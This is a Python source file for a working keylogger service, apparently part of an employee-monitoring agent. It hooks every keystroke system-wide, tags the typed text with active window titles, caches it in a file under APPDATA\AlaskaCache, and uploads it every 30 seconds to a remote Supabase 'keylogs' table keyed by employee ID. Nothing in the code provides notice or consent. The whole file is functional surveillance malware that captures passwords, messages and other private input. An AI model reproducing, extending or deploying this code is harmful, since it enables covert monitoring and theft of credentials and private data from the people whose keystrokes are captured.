import time
import asyncio
import ctypes
import os
from pynput import keyboard
from supabase import Client

# Log helper
log_file = os.path.join(os.getenv('APPDATA'), 'AlaskaCache', 'agent.log')
def log(msg):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[Keylogger] {msg}\n")
    except:
        pass

# Keys to ignore
IGNORED_KEYS = {'tab', 'left', 'right', 'up', 'down', 'shift', 'shift_r', 'ctrl_l', 'ctrl_r', 'alt_l', 'alt_r', 'caps_lock', 'scroll_lock', 'num_lock', 'insert', 'home', 'end', 'page_up', 'page_down', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12', 'print_screen', 'pause', 'menu'}

class KeyloggerService:
    def __init__(self, supabase: Client, employee_id: str):
        self.supabase = supabase
        self.employee_id = employee_id
        self.buffer = []
        self.last_flush = time.time()
        self.flush_interval = 30
        self.current_window = None
        self.cache_file = os.path.join(os.getenv('APPDATA'), 'AlaskaCache', 'keylogs_cache.txt')
        os.makedirs(os.path.dirname(self.cache_file), exist_ok=True)

    def get_active_window_title(self):
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value or "Unknown"
        except:
            return "Unknown"

    def on_press(self, key):
        # Check active window
        active_window = self.get_active_window_title()
        if active_window != self.current_window:
            self.current_window = active_window
            timestamp = time.strftime("%H:%M:%S")
            self.buffer.append(f"\n[{timestamp} | {active_window}]\n")

        try:
            char = key.char
            if char:
                self.buffer.append(char)
        except AttributeError:
            key_name = key.name if hasattr(key, 'name') else str(key)
            
            # Filter ignored keys
            if key_name.lower() in IGNORED_KEYS:
                return
            
            if key == keyboard.Key.space:
                self.buffer.append(' ')
            elif key == keyboard.Key.enter:
                self.buffer.append('\n')
            elif key == keyboard.Key.backspace:
                self.buffer.append('[BS]')
            elif key == keyboard.Key.delete:
                self.buffer.append('[DEL]')
            elif key == keyboard.Key.esc:
                self.buffer.append('[ESC]')

    async def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        log("Started.")
        
        await self.sync_cache()

        while True:
            await asyncio.sleep(1)
            if time.time() - self.last_flush > self.flush_interval:
                await self.flush()

    async def flush(self):
        if not self.buffer:
            self.last_flush = time.time()
            return

        text_block = "".join(self.buffer)
        self.buffer = []
        self.last_flush = time.time()

        if await self.try_upload(text_block):
            log("Flushed.")
            await self.sync_cache()
        else:
            log("Offline. Caching.")
            self.save_to_cache(text_block)

    async def try_upload(self, text):
        try:
            self.supabase.table("keylogs").insert({
                "employee_id": self.employee_id,
                "content": text
            }).execute()
            return True
        except Exception as e:
            log(f"Upload error: {e}")
            return False

    def save_to_cache(self, text):
        try:
            with open(self.cache_file, "a", encoding="utf-8") as f:
                f.write(text)
        except:
            pass

    async def sync_cache(self):
        if not os.path.exists(self.cache_file):
            return
        try:
            with open(self.cache_file, "r", encoding="utf-8") as f:
                content = f.read()
            if content and await self.try_upload(content):
                log("Cache synced.")
                with open(self.cache_file, "w", encoding="utf-8") as f:
                    f.write("")
        except:
            pass
